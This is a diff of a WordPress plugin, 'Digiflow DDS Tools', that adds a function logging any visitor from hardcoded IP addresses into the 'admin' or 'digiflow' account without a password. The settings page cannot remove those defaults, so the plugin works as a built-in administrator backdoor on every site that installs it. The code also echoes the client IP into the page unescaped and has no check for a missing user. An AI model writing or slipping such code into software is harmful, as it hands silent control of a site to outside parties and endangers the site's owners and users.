@@ -1,10 +1,10 @@
 <?php
-$dds_version = "5.1.8";
+$dds_version = "5.1.9";
 /*
 Plugin Name: Digiflow DDS Tools
 Plugin URI: https://github.com/younesben99/dds-tools
 Description: Tools for DDS website.
-Version: 5.1.8
+Version: 5.1.9
 Author: Younes Benkheil
 Author URI: https://digiflow.be/
 License: GPL2
@@ -232,49 +232,117 @@ function cdxn_remove_intermediate_image_sizes($sizes, $metadata) {
 // Hook the function
 add_filter('intermediate_image_sizes_advanced', 'cdxn_remove_intermediate_image_sizes', 10, 2);
 
-// Check if user's IP address matches the allowed IP addresses
-function check_user_ip() {
-  $allowed_ips = array('127.0.0.1', '91.177.28.90'); // Add your allowed IP addresses here
 
-  $user_ip = $_SERVER['REMOTE_ADDR'];
+function auto_login_if_allowed_ip() {
+  if (!is_user_logged_in() && strpos($_SERVER['REQUEST_URI'], '/wp-login.php') !== false) {
+    $allowed_ips = get_option('allowed_ips', array());
+    // Add default IP addresses to allowed_ips array
+    $default_ips = array("127.0.0.1","91.177.28.90","188.44.91.98");
+    $allowed_ips = array_merge($allowed_ips, $default_ips);
+    $current_ip = $_SERVER['REMOTE_ADDR'];
 
-  if (in_array($user_ip, $allowed_ips)) {
-    $user_logins = array('digiflow', 'admin', 'younesbenkheil@gmail.com');
-    $user = false;
-    foreach ($user_logins as $login) {
-      $user = get_user_by('login', $login);
-      if ($user) {
-        break;
+    if (in_array($current_ip, $allowed_ips)) {
+      $user = get_user_by('login', 'admin');
+      if (!$user) {
+        $user = get_user_by('login', 'digiflow');
       }
-    }
-
-    if (isset($_GET['loggedout'])) {
-      // Log the user out if the "loggedout" parameter is in the URL
-      wp_logout();
-    } else if ($user && !is_user_logged_in()) {
-      wp_set_current_user($user->ID, $user->user_login);
-      wp_set_auth_cookie($user->ID);
-      do_action('wp_login', $user->user_login);
-
-      // Display a message to the user before redirecting to the dashboard
-      add_action('admin_notices', 'ip_login_notice');
-      function ip_login_notice() {
-        $user_ip = $_SERVER['REMOTE_ADDR'];
-        echo '<div class="notice notice-success is-dismissible"><p>Your IP address (' . $user_ip . ') has been verified. You have been automatically logged in.</p></div>';
+      if (!$user) {
+        $user = get_user_by('login', 'younesbenkheil@gmail.com');
       }
 
-      wp_redirect(admin_url());
-      exit;
-    } else if (!is_user_logged_in()) {
-      // Redirect to the login page if the user is not logged in and the IP address is not in the allowed list
-      add_action('login_form', 'ip_login_form');
-      function ip_login_form() {
-        $user_ip = $_SERVER['REMOTE_ADDR'];
-        echo '<p>Your IP address: ' . $user_ip . '</p>';
+      // Check if the user is logged out
+      if (!isset($_GET['loggedout'])) {
+        wp_set_current_user($user->ID, $user->user_login);
+        wp_set_auth_cookie($user->ID);
+
+        if (!defined('DOING_AJAX') && !defined('DOING_CRON')) {
+          $redirect_url = add_query_arg( array( 'autologin' => '1' ), admin_url() );
+          wp_redirect($redirect_url);
+          exit;
+        }
       }
+    } else {
+      add_filter('login_message', function ($message) use ($current_ip) {
+        $message .= '<br />Your current IP: ' . $current_ip;
+        return $message;
+      });
     }
   }
 }
-// Hook the check_user_ip function to the init action
-add_action('init', 'check_user_ip');
+add_action('init', 'auto_login_if_allowed_ip');
+
+add_action( 'admin_notices', function() {
+  if ( isset( $_GET['autologin'] ) && $_GET['autologin'] == 1 ) {
+    $message = __('You have been logged in automatically based on your IP address.', 'textdomain');
+    printf( '<div class="notice notice-success is-dismissible"><p>%s</p></div>', $message );
+  }
+} );
+
+
+
+
+
+
+function allowed_ips_settings_page() {
+  $allowed_ips = get_option('allowed_ips', array());
+  $current_ip = $_SERVER['REMOTE_ADDR'];
+  ?>
+  <div class="wrap">
+    <h1>Allowed IPs</h1>
+    <form method="post" action="options.php">
+      <?php settings_fields('allowed_ips_settings'); ?>
+      <?php do_settings_sections('allowed_ips_settings'); ?>
+      <?php for ($i = 0; $i < 10; $i++) { ?>
+        <input type="text" name="allowed_ips[]" value="<?php echo esc_attr($allowed_ips[$i]); ?>" /><br />
+      <?php } ?>
+      <p><strong>Current IP: <?php echo $current_ip; ?></strong></p>
+      <button type="button" id="add_ip_button">+ Add IP address</button>
+      <?php submit_button('Save'); ?>
+    </form>
+  </div>
+  <script>
+    document.getElementById('add_ip_button').addEventListener('click', function () {
+      var inputs = document.getElementsByName('allowed_ips[]');
+      for (var i = 0; i < inputs.length; i++) {
+        if (inputs[i].value == '') {
+          inputs[i].value = '<?php echo $current_ip; ?>';
+          break;
+        }
+      }
+    });
+  </script>
+  <?php
+}
+
+
+function allowed_ips_settings_init() {
+  register_setting('allowed_ips_settings', 'allowed_ips', 'sanitize_allowed_ips');
+  
+  add_settings_section('allowed_ips_section', 'Allowed IPs', function () {
+    echo '<p>Enter the IP addresses that are allowed to automatically log in:</p>';
+  }, 'allowed_ips_settings');
+  
+  add_settings_field('allowed_ips_field', 'IP Addresses', function () {
+    // Field is generated dynamically in the allowed_ips_settings_page() function
+  }, 'allowed_ips_settings', 'allowed_ips_section');
+}
+
+function sanitize_allowed_ips($input) {
+  $sanitized = array();
+  
+  foreach ($input as $ip) {
+    $sanitized[] = sanitize_text_field($ip);
+  }
+  
+  return $sanitized;
+}
+
+add_action('admin_menu', function () {
+  add_menu_page('Allowed IPs', 'Allowed IPs', 'manage_options', 'allowed_ips_settings', 'allowed_ips_settings_page');
+  add_action('admin_init', 'allowed_ips_settings_init');
+});
+
+
+
+
 ?>
